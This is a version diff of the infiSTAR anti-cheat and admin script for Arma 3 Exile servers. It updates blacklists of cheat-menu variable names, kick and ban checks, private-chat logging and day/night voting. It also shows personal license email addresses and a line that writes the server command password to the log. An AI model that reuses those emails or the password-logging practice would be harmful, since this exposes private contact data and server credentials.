@@ -9,8 +9,8 @@
 	Arma AntiHack & AdminTools - infiSTAR.de
 */
 comment 'Antihack & AdminTools - Christian Lorenzen - www.infiSTAR.de';
-UPDATEEMAIL='psychotic_closure@hotmail.com';
-INFISTARVERSION='07-Mar-2016 04-06-16 - v0038';
+UPDATEEMAIL='gr8_boi52@yahoo.com';
+INFISTARVERSION='03-Apr-2016 23-22-35 - v0044';
 diag_log format['<infiSTAR.de> %1 - VERSION: %2',time,INFISTARVERSION];
 {
 	_uids = (_x select 0);
@@ -38,34 +38,6 @@ diag_log format['<infiSTAR.de> %1 - VERSION: %2',time,INFISTARVERSION];
 		};
 	} forEach _uids;
 } forEach _adminUIDandAccess;
-BIS_fnc_parsenumber = compileFinal '
-_number = param [0,-1,[0,"",{},configfile]];
-switch (typename _number) do {
-	case (typename {}): {
-		_number = call _number;
-		if (isnil {_number}) then {_number = -1;};
-		_number
-	};
-	case (typename ""): {
-		_number = parseNumber _number;
-		if (isnil {_number}) then {_number = -1;};
-		_number
-	};
-	case (typename configfile): {
-		if (isnumber _number) then {
-			getnumber _number
-		} else {
-			if (istext _number) then {
-				parseNumber (gettext _number)
-			} else {
-				-1
-			};
-		};
-	};
-	default {_number};
-};
-';
-publicVariable "BIS_fnc_parsenumber";
 _t = time;
 diag_log format['<infiSTAR.de> %1 - TESTING IF serverCommandPassword IS SET PROPERLY',_t];
 _return = _serverCommandPassword serverCommand format ['#kick %1',0];
@@ -73,7 +45,7 @@ if(!_return)then{_serverCommandPassword = getText(configfile >> 'CfgSettings' >>
 _return = _serverCommandPassword serverCommand format ['#kick %1',0];
 if(!_return)exitWith
 {
-	diag_log format['<infiSTAR.de> %1 - serverCommandPassword NOT SET!   psychotic_closure@hotmail.com - 07-Mar-2016 04-06-16 - v0038 - %2 - %3',_t,serverName,productVersion];
+	diag_log format['<infiSTAR.de> %1 - serverCommandPassword NOT SET!   gr8_boi52@yahoo.com - 03-Apr-2016 23-22-35 - v0044 - %2 - %3',_t,serverName,productVersion];
 	diag_log format['<infiSTAR.de> %1 - serverCommandPassword   in EXILE_AHAT_CONFIG.hpp is %2',_t,_serverCommandPassword];
 	diag_log format['<infiSTAR.de> %1 - serverCommandPassword   is defined in your servers config.cfg',_t];
 	diag_log format['<infiSTAR.de> %1 - serverCommandPassword   has to be set it in EXILE_AHAT_CONFIG.hpp where it says _serverCommandPassword = "changeme";',_t];
@@ -81,16 +53,16 @@ if(!_return)exitWith
 };
 FN_GET_SERVERPW = compileFinal (str _serverCommandPassword);
 diag_log format['<infiSTAR.de> %1 - serverCommandPassword IS FINE',_t];
-if!(isClass (missionconfigfile >> 'infiSTAR_AdminMenu' >> 'infi_BTN25'))exitWith
+if!(isClass (missionconfigfile >> 'infiSTAR_EDITBOX'))exitWith
 {
-	diag_log format['<infiSTAR.de> %1 - infiSTAR_Exile_AdminMenu.hpp in your MPmission is NOT UPDATED   psychotic_closure@hotmail.com - 07-Mar-2016 04-06-16 - v0038 - %2 - %3',_t,serverName,productVersion];
+	diag_log format['<infiSTAR.de> %1 - infiSTAR_Exile_AdminMenu.hpp in your MPmission is NOT UPDATED   gr8_boi52@yahoo.com - 03-Apr-2016 23-22-35 - v0044 - %2 - %3',_t,serverName,productVersion];
 	diag_log format['<infiSTAR.de> %1 - infiSTAR will not START if infiSTAR_Exile_AdminMenu.hpp is not updated!',_t];
 };
 _test = [0,{}] execFSM 'call.fsm';
 _test = [0,{}] execFSM 'call.fsm';
 if(_test isEqualTo 0)exitWith
 {
-	_log = format['<infiSTAR.de> %1 - call.fsm missing in your MPmission!    psychotic_closure@hotmail.com - 07-Mar-2016 04-06-16 - v0038 - %2 - %3',_t,serverName,productVersion];
+	_log = format['<infiSTAR.de> %1 - call.fsm missing in your MPmission!    gr8_boi52@yahoo.com - 03-Apr-2016 23-22-35 - v0044 - %2 - %3',_t,serverName,productVersion];
 	for '_i' from 0 to 30 do
 	{
 		diag_log _log;
@@ -115,12 +87,9 @@ fnc_getserverTime = compileFinal "
 	_seconds = time - (_hours*60*60) - (_minutes * 60);
 	format['%1h %2min %3s | ',_hours,_minutes,round _seconds]
 ";
-if(_WRITE_TXT_LOG_FILES)then
-{
-	FN_CALL_LOG_DLL = compileFinal "
-		'ARMA_LOG' callExtension format['%1_%2_%3',briefingName select [0,10],worldName select [0,10],_this];
-	";
-};
+FN_CALL_LOG_DLL = compileFinal "
+	'ARMA_LOG' callExtension format['%1%2_%3_%4',LOG_PATH,briefingName select [0,10],worldName select [0,10],_this];
+";
 FN_CALL_LOAD_DLL = compileFinal "
 	'ARMA_LOAD' callExtension _this
 ";
@@ -182,7 +151,7 @@ _fnc_RandomGen =
 	private '_gen';
 	_fnc_actualGen = {
 		_start	= ['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'];
-		_main	= ['B','g','q','g','I','S','Q','2','e','b','j','t','Y','8','y','n','t','f','R','W','t','g','N','u','w','X','n','p','F','H'];
+		_main	= ['I','T','I','g','A','q','P','z','D','4','p','l','t','b','1','X','S','6','X','i','6','e','N','X','I','7','a','h','3','o'];
 		_filler	= ['1','2','3','4','5','6','7','8','9','0','_','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
 		_gen = selectRandom _start;
 		_randmax = {((round(random _randminval)) + (round(random _randmaxval))) max _randminval};
@@ -209,6 +178,7 @@ _token_by_uid = call _fnc_RandomGen;format['_token_by_uid: %1',_token_by_uid] ca
 _uid_by_token = call _fnc_RandomGen;format['_uid_by_token: %1',_uid_by_token] call FNC_A3_LOG_RAND_VAR;
 _name_by_uid = call _fnc_RandomGen;format['_name_by_uid: %1',_name_by_uid] call FNC_A3_LOG_RAND_VAR;
 _owner_by_uid = call _fnc_RandomGen;format['_owner_by_uid: %1',_owner_by_uid] call FNC_A3_LOG_RAND_VAR;
+_object_by_uid = call _fnc_RandomGen;format['_object_by_uid: %1',_object_by_uid] call FNC_A3_LOG_RAND_VAR;
 _replaceOnCD = call _fnc_RandomGen;format['_replaceOnCD: %1',_replaceOnCD] call FNC_A3_LOG_RAND_VAR;
 _onPlayerConnected = call _fnc_RandomGen;format['_onPlayerConnected: %1',_onPlayerConnected] call FNC_A3_LOG_RAND_VAR;
 _server_setTokenR = call _fnc_RandomGen;format['_server_setTokenR: %1',_server_setTokenR] call FNC_A3_LOG_RAND_VAR;
@@ -238,7 +208,8 @@ _fnc_remove_badvehicle = call _fnc_RandomGen;format['_fnc_remove_badvehicle: %1'
 _fnc_vehicle_check = call _fnc_RandomGen;format['_fnc_vehicle_check: %1',_fnc_vehicle_check] call FNC_A3_LOG_RAND_VAR;
 format['----END-LINE----   (%1)',INFISTARVERSION] call FNC_A3_LOG_RAND_VAR;
 _badChatTMP = _badChat;_badChat = ["infishit"];{_badChat pushBackUnique (toLower _x);}forEach _badChatTMP;
-_badNamesTMP = _badNames;_badNames = [];{_badNames pushBackUnique (toLower _x);}forEach _badNamesTMP;
+_badNamesFullTMP = _badNamesFull;_badNamesFull = [];{_badNamesFull pushBackUnique (toLower _x);}forEach _badNamesFullTMP;
+_badNamesPartialTMP = _badNamesPartial;_badNamesPartial = [];{_badNamesPartial pushBackUnique (toLower _x);}forEach _badNamesPartialTMP;
 _badGroupNamesTMP = _badGroupNames;_badGroupNames = [];{_badGroupNames pushBackUnique (toLower _x);}forEach _badGroupNamesTMP;
 _variable1 = toString[105,115,114,117,110,110,105,110,103];
 diag_log format['<infiSTAR.de> %1 - loading AntiHack..',time];
@@ -257,7 +228,7 @@ _blacklistedVariables =
 	'BIS_fnc_dbg_reminder_value','BIS_fnc_dbg_reminder','BIS_MENU_GroupCommunication','BIS_fnc_addCommMenuItem_menu',
 	'rscspectator','rscspectator_hints','rscspectator_display','rscspectator_playericon',
 	'rscspectator_view','rscspectator_map','rscspectator_vision','rscspectator_keys',
-	'rscspectator_interface',
+	'rscspectator_interface','bis_fnc_camera_target',
 	'time','serverTime','myplayeruid','hhahaaaaar','CharlieSheenkeybinds','KickOFF','yolo','runonce','notakeybind','action1','Supa_Licenses','autokick','wallaisseikun','MainMenu',
 	'GEFClose','GEFWhite','GEFRed','GEFGreen','GEFCyan','FirstHint','new_queued','fn_Exec','FND_fnc_select','fnx3','ANTIHACKKICK','tele','dmap','GOLDENS_GLOBAL_SHIT_YEAH','GLASS911_Run',
 	'gearDialog_create','lystoKeypress','ThirtySix','LY_SwaggerLikeUs','Jkeyszz','n2','boxofmagic','MainScripts','DMC_fnc_4danews','INFISTARBYPASS','EXEC_TEXT','vehicle_dblclick','init_main',
@@ -267,7 +238,7 @@ _blacklistedVariables =
 	'Fanatic_InfiPass','keybindings_xxx','AndysClosed','UserFuncs','AltisFuncs','RemExe','BB_nofatigue','bis_fnc_diagkey_var_code','First_PAGE','Get_in_D','i_t_s__m_e_o','smissles','Whippy_ESP',
 	'TargetFuncs2','life_fnc_antiFreeeeze','LY_keyForward','TY_re_onetime','life_fnc_XaAxAA','mein1','GodDamnVehiclesXD','Mystic_FNC_ESP_distance','Esp_Id_setter','DummyMen','whipbut','UserFuncs',
 	'KrohdoFreedom','selectedPlayer','Lmenu1','ggplayer','throx_menu_item','lvl1','Init_Menu_Slew','D_B_R_T_Y_Slew','V6_GEF','xasfjisisafudmmyx','kekse','UPDATED_RE_36','first','second',
-	'SNI_PRZ_ZZZ_TargetPlayer','healit','O_fnc_ArmA','MLRN_EXEC','running_threads','catchemall938','killtarget'
+	'SNI_PRZ_ZZZ_TargetPlayer','healit','O_fnc_ArmA','MLRN_EXEC','running_threads','catchemall2128','killtarget','GMToggle'
 ];
 _blacklistedAdminVariables =
 [
@@ -282,13 +253,6 @@ _tofindcontent =
 [
 	'+ _code +','infiesp'
 ];
-if(!_RHS_CUP_MOD_ENABLED)then{
-_tofindcontent append
-[
-	'waituntil {inputaction ','setammo','setvehicleammo'
-];
-};
-
 _tofindboth =
 [
 	'xxx_','k3ybinds','jme_','_g0d_','infistatus',
@@ -314,7 +278,7 @@ if(!isNil'_tmp_blacklistedVariables')then
 		_blacklistedVariables append _tmp_blacklistedVariables;
 	};
 };
-_allowedMarkers = ['TreasureMarker','ExilePartyMarker','Death','_USER_DEFINED','[',']'];
+_allowedMarkers = ['TreasureMarker','ExilePartyMarker','ExileSupplyBox','Death','_USER_DEFINED','[',']'];
 _VehicleWhiteListTEMP = _VehicleWhiteList;_VehicleWhiteList = [];{_VehicleWhiteList pushBackUnique (toLower _x);} forEach _VehicleWhiteListTEMP;_VehicleWhiteListTEMP=nil;
 _ForbiddenVehiclesTEMP = _ForbiddenVehicles;_ForbiddenVehicles = [];{_ForbiddenVehicles pushBackUnique (toLower _x);} forEach _ForbiddenVehiclesTEMP;_ForbiddenVehiclesTEMP=nil;
 if(_UMW)then{_allowedMarkers append _aLocalM;};
@@ -335,21 +299,75 @@ _chatCommandsL = [];
 {
 	_chatCommandsL pushBackUnique [toLower(_x select 0),(_x select 1)];
 } forEach _chatCommands;
+_chatCommandsPL = [];
+{
+	_chatCommandsPL pushBackUnique [toLower(_x select 0),(_x select 1)];
+} forEach _chatCommandsP;
 
 
 if(_HTML_LOAD_URL != "")then{HTML_LOAD_URL3 = _HTML_LOAD_URL;publicVariable "HTML_LOAD_URL3";};
-FN_GET_OBJ_BY_OWNER = compileFinal "
-	_playerObj = objNull;{if(owner _x isEqualTo _owner)exitWith{_playerObj=_x};} forEach allPlayers;_playerObj
-";
-call compile ("
 if(isNil'CUSTOM_FUNCTION_ARRAY')then{CUSTOM_FUNCTION_ARRAY = [];};
-CUSTOM_FUNCTION_EXTENDED = {
+CUSTOM_FUNCTION_EXTENDED = compileFinal "
 	if(CUSTOM_FUNCTION_ARRAY isEqualTo [])exitWith{false};
 	_option = _this select 0;
 	_input = _this select 1;
 	_return = _input call (CUSTOM_FUNCTION_ARRAY select _option);
 	_return
+";
+if(_ENABLE_PRIVATE_CHAT_MENU)then{
+_privchat = {
+	_senderNetId = _this select 0;
+	_receiverNetId = _this select 1;
+	_time = _this select 2;
+	_text = _this select 3;
+	_senderObj = objectFromNetId _senderNetId;
+	_receiverObj = objectFromNetId _receiverNetId;
+	if(!isNull _senderObj && !isNull _receiverObj)then
+	{
+		_senderName = _senderObj getVariable['ExileName',name _senderObj];
+		_receiverName = _receiverObj getVariable['ExileName',name _receiverObj];
+		
+		['CHAT',format['(%1) %2 -> %3: %4',_time,_senderName,_receiverName,_text]] call FNC_A3_CUSTOMLOG;
+		
+		[
+			[_senderName,_receiverName,_time,_text,_senderNetId],
+			{
+				params['_senderName','_receiverName','_time','_text','_senderNetId'];
+				CHAT_HISTORY_ARRAY pushBack _this;
+				
+				_senderObj = (objectFromNetId _senderNetId);
+				ACTIVE_CHATS = ACTIVE_CHATS - [_senderObj];
+				ACTIVE_CHATS pushBackUnique _senderObj;
+				
+				call fnc_fill_chat_history;
+				systemChat format['%1 (%2): %3',_senderName,_time,_text];
+				playsound 'AddItemOK';
+				['Success',format['%1: %2:',_senderName,_text]] call ExileClient_gui_notification_event_addNotification;
+			},
+			owner _receiverObj,
+			false
+		] call FN_infiSTAR_S;
+	};
 };
+CUSTOM_FUNCTION_ARRAY set[4,_privchat];
+};
+call compile ("
+FNC_OWNER_BY_UID = compileFinal ""
+	params[['_uid','']];
+	_owner = missionNameSpace getVariable[format['"+_owner_by_uid+"%1',_uid],-10];
+	if(_owner isEqualTo -10)then
+	{
+		_clientObject = missionNameSpace getVariable[format['"+_object_by_uid+"%1',_uid],objNull];
+		if(!isNull _clientObject)then
+		{
+			if(isPlayer _clientObject)then
+			{
+				_owner = owner _clientObject;
+			};
+		};
+	};
+	if(_owner > 2)then{_owner}else{-10}
+"";
 fnc_AdminReq = compileFinal '
 	_inputOption = _this select 0;
 	_inputParams = _this select 1;
@@ -359,21 +377,7 @@ fnc_AdminReq = compileFinal '
 	if(_inputOption isEqualTo 3)exitWith{_inputParams call CUSTOM_FUNCTION_EXTENDED;true};
 ';
 ");
-
-
-/*
-Let us exchange remoteExecCall from clients -> server with publicVariableServer as it seems like remoteExecCall is causing some trouble at the moment!
-
 FN_infiSTAR_CS = compileFinal "_this remoteExecCall ['fnc_AdminReq', 2, false]";publicVariable"FN_infiSTAR_CS";
-*/
-/*
-'SERVER_REQ_INFI_CLIENT' addPublicVariableEventhandler {(_this select 1) call fnc_AdminReq;SERVER_REQ_INFI_CLIENT=nil;};
-FN_infiSTAR_CS = compileFinal "SERVER_REQ_INFI_CLIENT = _this;publicVariableServer 'SERVER_REQ_INFI_CLIENT';SERVER_REQ_INFI_CLIENT=nil;";publicVariable"FN_infiSTAR_CS";
-*/
-FN_infiSTAR_CS = compileFinal "_this remoteExecCall ['fnc_AdminReq', 2, false]";publicVariable"FN_infiSTAR_CS";
-
-
-
 FN_infiSTAR_F = compileFinal "missionNameSpace setVariable[(_this select 0),compileFinal(_this select 1)]";publicVariable"FN_infiSTAR_F";
 FN_infiSTAR_C = compileFinal "(_this select 0) call (_this select 1)";publicVariable"FN_infiSTAR_C";
 FN_infiSTAR_S = compileFinal "
@@ -429,6 +433,9 @@ fnc_call_ARMALOAD = compileFinal "
 			format['%1(%2) is %3',_name,_puid,_res] call FNC_A3_RESOLVESTEAMNAMELOG;
 		};
 	};
+";
+FN_GET_OBJ_BY_OWNER = compileFinal "
+	_playerObj = objNull;{if(owner _x isEqualTo _owner)exitWith{_playerObj=_x};} forEach allPlayers;_playerObj
 ";
 fnc_resolveSteamName = compileFinal "
 	private['_name','_puid','_clientID','_inputToForward','_steamName'];
@@ -510,6 +517,9 @@ fnc_stop_safe_glitch = compileFinal "
 ";
 publicVariable "fnc_stop_safe_glitch";
 };
+fnc_remove_billboard = compileFinal "
+	_vehicleID = _this getVariable ['ExileDatabaseID', -1];if(_vehicleID > -1)then{format ['deleteVehicle:%1', _vehicleID] call ExileServer_system_database_query_fireAndForget;};
+";
 if(!isNil'infiSTAR_DEBUG')then{
 	fn_log_debug = compileFinal "
 		_id = _this select 0;
@@ -579,6 +589,10 @@ fnc_deleteObject = compileFinal "
 			};
 		};
 	};
+	if(_objToDelete isKindOf 'Exile_Sign_TraderCity')then
+	{
+		_objToDelete call fnc_remove_billboard;
+	};
 	if(!isNull _objToDelete)then
 	{
 		if(!isNull _objToDelete)then
@@ -597,27 +611,31 @@ fnc_serverMassMessage = compileFinal "
 	[_msg,_code,_clientID,false] call FN_infiSTAR_S;
 ";
 diag_log format['<infiSTAR.de> %1 - Thread MAIN: none-threaded code compiled and/or sent!',time];
-if(_VDN)then{
+if(_DayNightVote)then{
+VOTETIME_MRV = _MRV;
+VOTETIME_MVP = _MVP;
+VOTETIME_VCT = _VCT;
+VOTETIME_LVT = 0;
+VOTETIME_ARR = [];
 fnc_VoteTimeServer = compileFinal "
 	_clientUID = _this select 0;
 	_vote = _this select 1;
-	
-	if(isNil 'TimeVoteCooldown')then{TimeVoteCooldown = 300;};
-	if(isNil 'LastVoteGoneThrough')then{LastVoteGoneThrough = 600;};
-	if((TimeVoteCooldown + LastVoteGoneThrough) < time)then
+	if((VOTETIME_VCT + VOTETIME_LVT) < time)then
 	{
-		if(isNil 'VoteArray')then{VoteArray = [];};
-		if!(_clientUID in VoteArray)then
+		
+		if!(_clientUID in VOTETIME_ARR)then
 		{
-			VoteArray pushBack _clientUID;
-			VoteArray pushBack _vote;
-			_cntAll = count playableUnits;
-			_cntVoted = {getPlayerUID _x in VoteArray} count playableUnits;
+			_players = allPlayers;
+			VOTETIME_ARR pushBack _clientUID;
+			VOTETIME_ARR pushBack _vote;
+			_cntAll = count _players;
+			_cntVoted = {getPlayerUID _x in VOTETIME_ARR} count _players;
 			if((_cntAll > 0) && (_cntVoted > 0))then
 			{
 				_cntday = 0;
 				_cntnight = 0;
-				if((_cntVoted / _cntAll) > 0.59)then
+				_rateAll = _cntVoted / _cntAll;
+				if(_rateAll >= VOTETIME_MVP)then
 				{
 					_oUIDs = [];
 					{
@@ -626,11 +644,11 @@ fnc_VoteTimeServer = compileFinal "
 						{
 							_oUIDs pushBack _xUID;
 						};
-					} forEach playableUnits;
-					for '_i' from 0 to (count VoteArray)-1 step 2 do
+					} forEach _players;
+					for '_i' from 0 to (count VOTETIME_ARR)-1 step 2 do
 					{
-						_cUID = VoteArray select _i;
-						_cVOTE = VoteArray select (_i+1);
+						_cUID = VOTETIME_ARR select _i;
+						_cVOTE = VOTETIME_ARR select (_i+1);
 						if(_cUID in _oUIDs)then
 						{
 							if(_cVOTE == 'DAY')then{_cntday = _cntday + 1;};
@@ -638,23 +656,44 @@ fnc_VoteTimeServer = compileFinal "
 						};
 					};
 					
-					_txt = format['%1 of %2 Players voted - %3 for Day and %4 for Night',_cntVoted,_cntAll,_cntday,_cntnight];
+					_date = date;
+					_changeTime = false;
+					if!(_cntday isEqualTo _cntnight)then
+					{
+						if(_cntday > _cntnight)then
+						{
+							_rateDay = if(_cntday isEqualTo 0)then{0}else{_cntday / _cntAll};
+							if(_rateDay >= VOTETIME_MRV)then
+							{
+								_date set [3,11];
+								_changeTime = true;
+							};
+						}
+						else
+						{
+							_rateNight = if(_cntnight isEqualTo 0)then{0}else{_cntnight / _cntAll};
+							if(_rateNight >= VOTETIME_MRV)then
+							{
+								_date set [3,23];
+								_changeTime = true;
+							};
+						};
+					};
+					
+					if(_changeTime)then
+					{
+						setDate _date;
+						VOTETIME_ARR = [];
+						VOTETIME_LVT = time;
+					};
+					
+					_txt = format['%1 of %2 (%3) Players voted - %4 for Day and %5 for Night',_cntVoted,_cntAll,(str (_rateAll*100)+'%'),_cntday,_cntnight];
 					_msg = ['<t size=''0.55'' font =''OrbitronLight'' color=''#00B1CC''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];
 					[_msg,-2] call fnc_serverMassMessage;
-					
-					_date = date;
-					_date set [3,11];
-					if(_cntnight > _cntday)then
-					{
-						_date set [3,23];
-					};
-					setDate _date;
-					VoteArray = [];
-					LastVoteGoneThrough = time;
 				}
 				else
 				{
-					_txt = format['%1 of %2 Players voted (in chat type /vote day or /vote night',_cntVoted,_cntAll];
+					_txt = format['%1 of %2 (%3) Players voted (in chat type /vote day or /vote night)',_cntVoted,_cntAll,(str (_rateAll*100)+'%')];
 					_msg = ['<t size=''0.55'' font =''OrbitronLight'' color=''#00B1CC''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];
 					[_msg,-2] call fnc_serverMassMessage;
 				};
@@ -663,7 +702,7 @@ fnc_VoteTimeServer = compileFinal "
 	}
 	else
 	{
-		_txt = format['Wait %1s more until next day/night vote can be made',round((TimeVoteCooldown + LastVoteGoneThrough) - time)];
+		_txt = format['Wait %1s more until next day/night vote can be made',round((VOTETIME_VCT + VOTETIME_LVT) - time)];
 		_msg = ['<t size=''0.55'' font =''OrbitronLight'' color=''#00B1CC''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];
 		[_msg,-2] call fnc_serverMassMessage;
 	};
@@ -678,7 +717,6 @@ _startAsNormal = [];
 		_startAsNormal pushBackUnique _x;
 	};
 } forEach _tmpstartAsNormal;
-_devs = ['0','0'];{if(count _x > 5)then{_devs pushBackUnique _x;};} forEach _hiddenSuperAdmin;{_admins pushBackUnique _x;} forEach _devs;
 diag_log format['<infiSTAR.de> %1 - Thread BEFORE MAIN: adding to main string..',time];
 _A3AHstring = "
 diag_log format['<infiSTAR.de> %1 - Thread BEFORE MAIN: still compiling...',time];
@@ -719,7 +757,7 @@ publicVariable 'fnc_check_uniform_n_vest';
 fnc_variable_to_admins = compileFinal '
 	_fn_send = {
 		{
-			_owner = missionNameSpace getVariable[format[''"+_owner_by_uid+"%1'',_x],-10];
+			_owner = _x call FNC_OWNER_BY_UID;
 			if!(_owner isEqualTo -10)then
 			{
 				_owner publicVariableClient _this;
@@ -844,7 +882,7 @@ _FN_INJECT_ON_CLIENT = {
 					_bv = nil;_bv = uiNamespace getVariable _x;
 					if(!isNil '_bv')then
 					{
-						_log = format['BadVariable in uiNamespace: %1 - %2',_x,_bv];
+						_log = format['BadVariable in uiNamespace: %1 - %2 (these variables can be set in the editor)',_x,_bv];
 						[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
 						[] call _AHKickOFF;
 					};
@@ -859,14 +897,14 @@ _FN_INJECT_ON_CLIENT = {
 					if(!isNil '_bv')then
 					{
 						_log = format['BadVariable in parsingNamespace: %1 - %2',_x,_bv];
-						[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
+						[_name,_puid,'TMPBAN',toArray(_log)] call _AHKickLog;
 						[] call _AHKickOFF;
 					};
 					_bv = nil;_bv = player getVariable _x;
 					if(!isNil '_bv')then
 					{
 						_log = format['BadVariable in objectNamespace (player): %1 - %2',_x,_bv];
-						[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
+						[_name,_puid,'TMPBAN',toArray(_log)] call _AHKickLog;
 						[] call _AHKickOFF;
 					};
 				} forEach _blacklistedVariables;
@@ -880,9 +918,9 @@ _FN_INJECT_ON_CLIENT = {
 						_max = getNumber(_config >> 'count');
 						if(_max > 0)then
 						{
-							if(_magSize > _max)exitWith
+							if(_magSize > (_max+10))exitWith
 							{
-								_log = format['Maximum magazine size is %1, player value was: %2',_max,_magSize];
+								_log = format['Maximum magazine size is %1, player value was: %2 - magazine: %3',_max,_magSize,_magName];
 								[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
 								[] call _AHKickOFF;
 							};
@@ -911,41 +949,7 @@ _FN_INJECT_ON_CLIENT = {
 					};
 				} forEach (allVariables missionNamespace);
 			};
-			
-			if(diag_tickTime > _startTime)then
-			{
-				"; if(_checkKeyDown)then{ _A3AHstring = _A3AHstring + "
-				_id = (finddisplay 46) displayAddEventHandler ['KeyDown',{ _this call ExileClient_gui_hud_event_onKeyDown }];
-				if(_id > "+str _checkKeyDownMax+")then
-				{
-					_log = format['KeyDown eventhandler changed/added: ID %1 should be 1',_id];
-					[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
-					[] call _AHKickOFF;
-				};
-				"; }; _A3AHstring = _A3AHstring + "
-				(findDisplay 46) displayRemoveAllEventHandlers 'KeyDown';
-				(finddisplay 46) displayAddEventHandler ['KeyDown',{ _this call ExileClient_gui_hud_event_onKeyDown }];
-				"; if(_checkKeyUp)then{ _A3AHstring = _A3AHstring + "
-				_id = (finddisplay 46) displayAddEventHandler ['KeyUp',{ _this call ExileClient_gui_hud_event_onKeyUp }];
-				if(_id > "+str _checkKeyUpMax+")then
-				{
-					_log = format['KeyUp eventhandler changed/added: ID %1 should be 1',_id];
-					[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
-					[] call _AHKickOFF;
-				};
-				"; }; _A3AHstring = _A3AHstring + "
-			};
 		};
-		(findDisplay 46) displayRemoveAllEventHandlers 'KeyUp';
-		(finddisplay 46) displayAddEventHandler ['KeyUp', {
-			_keyCode = _this select 1;
-			_handle = false;
-			if(_keyCode in (actionKeys 'User3'))then{if(!isNil'fnc_chat_send')then{if(isNull (findDisplay -1340))then{createdialog 'infiSTAR_CHAT';};};_handle = true;};
-			if(_keyCode in (actionKeys 'User4'))then{player playMoveNow 'AmovPercMstpSnonWnonDnon_exerciseKata';_handle = true;};
-			if(_keyCode in (actionKeys 'User5'))then{player playMoveNow 'AmovPercMstpSnonWnonDnon_exercisePushup';_handle = true;};
-			if(!_handle)then{_handle = _this call ExileClient_gui_hud_event_onKeyUp;};
-			_handle
-		}];
 		if(_vctoo < diag_tickTime)then
 		{
 			_vctoo = diag_tickTime + 40;
@@ -1030,69 +1034,78 @@ _FN_INJECT_ON_CLIENT = {
 			"; }; _A3AHstring = _A3AHstring + "
 			"; }; _A3AHstring = _A3AHstring + "
 		};
-		_display24 = findDisplay 24;
-		if(!isNull _display24)then
+		
+		if(!isNull (findDisplay 24))then
 		{
-			_chat = _display24 displayCtrl 101;
-			_txt = ctrlText _chat;
-			
 			_idKeydown24 = 9001;
 			_randomNumber = (floor(random 8))+1;
 			for '_i' from 0 to _randomNumber do
 			{
-				_idKeydown24 = (finddisplay 24) displayAddEventHandler ['KeyDown',{false}];
+				_idKeydown24 = (findDisplay 24) displayAddEventHandler ['KeyDown',{false}];
 			};
 			if!(_idKeydown24 isEqualTo _randomNumber)then
 			{
 				if(_idKeydown24 isEqualTo -1)exitWith{};
-				_log = format['ChatMenu Found: %1 should be %2 (txt: %3)',_idKeydown24,_randomNumber,_txt];
-				[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
-				[] call _AHKickOFF;
+				for '_i' from 0 to 3 do{(findDisplay 24) closeDisplay 0;};
 			};
-			(findDisplay 24) displayRemoveAllEventHandlers 'KeyDown';
-			
-			if(_txt != '')then
+			if(!isNull (findDisplay 24))then
 			{
-				_txt = toLower _txt;
-				if(_admin)then
+				(findDisplay 24) displayRemoveAllEventHandlers 'KeyDown';
+				_chat = (findDisplay 24) displayCtrl 101;
+				_txt = ctrlText _chat;
+				if(_txt != '')then
 				{
-					if(_txt isEqualTo '!admin')then
+					_txt = toLower _txt;
+					if(_admin)then
 					{
-						waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
-						[_name,_puid,'AC',toArray(_txt)] call _AHKickLog;
-						(findDisplay 46)closeDisplay 0;
+						if(_txt isEqualTo '!admin')then
+						{
+							waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
+							[_name,_puid,'AC',toArray(_txt)] call _AHKickLog;
+							(findDisplay 46)closeDisplay 0;
+						};
 					};
-				};
-				{
-					_x0 = _x select 0;
-					if(_txt isEqualTo _x0)exitWith
 					{
-						_x1 = _x select 1;
+						_x0 = _x select 0;
+						if(_txt isEqualTo _x0)exitWith
+						{
+							_x1 = _x select 1;
+							waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
+							[parseText format['<t color=''#2784D6'' size=''1'' font =''OrbitronMedium''>%1</t>',_x1],0,0,5,0] spawn bis_fnc_dynamictext;
+							systemChat _x1;
+						};
+					} forEach "+str _chatCommandsL+";
+					{
+						_x0 = _x select 0;
+						if(_txt find _x0 != -1)exitWith
+						{
+							_x1 = _x select 1;
+							waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
+							[parseText format['<t color=''#2784D6'' size=''1'' font =''OrbitronMedium''>%1</t>',_x1],0,0,5,0] spawn bis_fnc_dynamictext;
+							systemChat _x1;
+						};
+					} forEach "+str _chatCommandsPL+";
+					{
+						if(_txt find _x > -1)exitWith{
+							waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
+							_log = format['BadText on Chat: %1 [%2]',_txt,_x];
+							[_name,_puid,'SLOG',toArray(_log)] call _AHKickLog;
+						};
+					} forEach "+str _badChat+";
+					"; if(_DayNightVote)then{ _A3AHstring = _A3AHstring + "
+					if((_txt select [0,8] isEqualTo 'vote day')||(_txt select [1,8] isEqualTo 'vote day'))then{
 						waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
-						[parseText format['<t color=''#2784D6'' size=''1'' font =''OrbitronMedium''>%1</t>',_x1],0,0,4,0] spawn bis_fnc_dynamictext;
-						systemChat _x1;
+						[_name,_puid,'VOTE',toArray 'DAY'] call _AHKickLog;
 					};
-				} forEach "+str _chatCommandsL+";
-				{
-					if(_txt find _x > -1)exitWith{
+					if((_txt select [0,10] isEqualTo 'vote night')||(_txt select [1,10] isEqualTo 'vote night'))then{
 						waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
